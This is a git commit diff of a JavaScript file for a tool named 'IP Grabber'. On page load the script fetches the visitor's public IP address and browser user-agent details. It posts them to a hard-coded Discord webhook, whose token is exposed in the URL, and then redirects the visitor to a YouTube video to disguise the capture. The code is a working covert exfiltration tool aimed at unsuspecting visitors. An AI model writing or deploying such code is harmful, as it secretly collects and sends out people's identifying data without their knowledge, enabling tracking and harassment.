2a0eb5c682b472ffe3189020af4a8880ef42463d
twixxyLV <82390415+twixxyLV@users.noreply.github.com>
2021-04-13 14:32:48 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,20 +1,22 @@
-function SendMessage(message) {
+$.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
     var request = new XMLHttpRequest();
     request.open("POST", "https://discord.com/api/webhooks/818588973684490310/teQkvpePWmG7afPaZpnPNxA76XXnaipYOmhtXoSUbY7aim8OFvSeQJpld47f5_r6nzXf");
     request.setRequestHeader('Content-type', 'application/json');
 
+    request.onloadend = () => {
+        setTimeout(function() {
+            window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+        }, 100);
+    }
+
     var params = {
         username: "IP Grabber",
-        content: message
+        content: "```"
+               + "IP: " + data.ip + "\n\n"
+               + "appVersion: " + navigator.appVersion + "\n\n"
+               + "userAgent: " + navigator.userAgent + "\n\n"
+               + "```"
     }
 
     request.send(JSON.stringify(params));
-}
-
-$.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
-    SendMessage("```IP: " + data.ip + "```");
-
-    setTimeout(function() {
-        window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-    }, 1000);
 });
